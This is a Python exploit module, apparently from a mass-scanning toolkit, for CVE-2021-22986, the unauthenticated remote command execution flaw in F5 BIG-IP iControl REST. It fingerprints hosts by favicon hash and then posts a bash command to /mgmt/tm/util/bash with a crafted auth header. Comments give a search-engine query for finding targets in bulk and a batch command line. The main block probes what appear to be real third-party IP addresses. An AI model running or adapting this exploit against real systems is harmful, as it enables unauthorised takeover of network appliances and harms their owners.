# coding=utf-8
# @Author   : zpchcbd HG team
# @Time     : 2021-09-19 17:02

import hashlib
from colorama import Fore
from tqdm import tqdm

from exploit.web import BaseScript
from core.MyEnums import *
from core.MyAsyncHttp import *


# fofa: "BIG-IP" && country="CN"
# python batch.py -m exploit.web.BIG-IP.unauth_rce -cs -fs "body=\"F5 Networks, Inc\""

class Script(BaseScript):
    name = 'BIG-IP'

    def __init__(self, target, session):
        super().__init__()
        # 漏洞目标
        self.target = target
        # 漏洞等级
        self.bugLevel = BugLevel.HIGH
        # 类型
        self.bugType = BugType.RCE and BugType.UNAUTH
        # 编号
        self.bugNumber = 'CVE-2021-22986'
        # 来源
        self.refer = 'https://attackerkb.com/topics/J6pWeg5saG/k03009991-icontrol-rest-unauthenticated-remote-command-execution-vulnerability-cve-2021-22986'
        # 特定路径判断
        self.detectPathList = ['/favicon.ico']
        # exec
        self.execPathList = ['/mgmt/tm/util/bash']
        # session
        self.session = session
        # 相关信息
        self.info = '''
        F5 BIG-IP iControl REST unauthenticated RCE
        F5 BIG-IP 16.0.0-16.0.1
        F5 BIG-IP 15.1.0-15.1.2
        F5 BIG-IP 14.1.0-14.1.3.1
        F5 BIG-IP 13.1.0-13.1.3.5
        F5 BIG-IP 12.1.0-12.1.5.2
        F5 BIG-IQ 7.1.0-7.1.0.2
        F5 BIG-IQ 7.0.0-7.0.0.1
        F5 BIG-IQ 6.0.0-6.1.0
        '''
        self.favicon = ['04d9541338e525258daf47cc844d59f3']

    async def detect(self):
        try:
            for detectPath in self.detectPathList:
                url = f'http://{self.target}{detectPath}' if self.target.startswith(
                    ('http:', 'https:')) is False else f'{self.target}{detectPath}'
                async with self.session.get(url=url, headers=self.headers, timeout=self.reqTimeout,
                                            verify_ssl=False) as response:
                    if response is not None:
                        text = await response.read()
                        await asyncio.sleep(2)
                        m1 = hashlib.md5()
                        m1.update(text)
                        theMD5 = m1.hexdigest()
                        for _ in self.favicon:
                            if _ == theMD5:
                                self.flag = True
                                tqdm.write(Fore.RED + '[{}] {}'.format('BIG-IP Finger', url))
                                return {'name': 'BIG-IP Finger', 'url': url, 'software': 'BIG-IP'}
        except Exception:
            return None

    async def exec(self):
        headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36",
            'Content-Type': 'application/json',
            'X-F5-Auth-Token': '',
            'Authorization': 'Basic YWRtaW46QVNhc1M='
        }
        try:
            for execPath in self.execPathList:
                url = f'http://{self.target}{execPath}' if self.target.startswith(
                    ('http:', 'https:')) is False else f'{self.target}{execPath}'
                data = '{"command": "run", "utilCmdArgs": "-c id"}'
                async with self.session.post(url=url, headers=headers, data=data, timeout=self.reqTimeout,
                                             verify_ssl=False) as response:
                    if response is not None:
                        text = await response.text()
                        await asyncio.sleep(2)
                        if 'commandResult' in text:
                            # print(text)
                            tqdm.write(Fore.RED + '[{}] {}'.format('BIG-IP RCE', url))
                            return {'name': 'BIG-IP RCE', 'url': url, 'software': 'BIG-IP'}
        except Exception:
            return None

    async def attack(self, semaphore, pbar):
        async with semaphore:
            a = await self.detect()
            if a is not None:
                self.vulList.append(a)
            if self.flag:
                b = await self.exec()
                if b is not None:
                    self.vulList.append(b)
        pbar.update(1)
        return self.vulList


if __name__ == '__main__':
    import requests
    import hashlib

    resp = requests.get('https://50.84.113.154:8443/favicon.ico', verify=False)
    if resp.status_code == 200:
        m1 = hashlib.md5()
        m1.update(resp.content)
        theMD5 = m1.hexdigest()
        print(theMD5)
    #
    # semaphore = asyncio.Semaphore(500)
    # sc = Script('61.150.65.205:9999', 1)
    # l = asyncio.get_event_loop()
    # l.run_until_complete(sc.attack(semaphore))
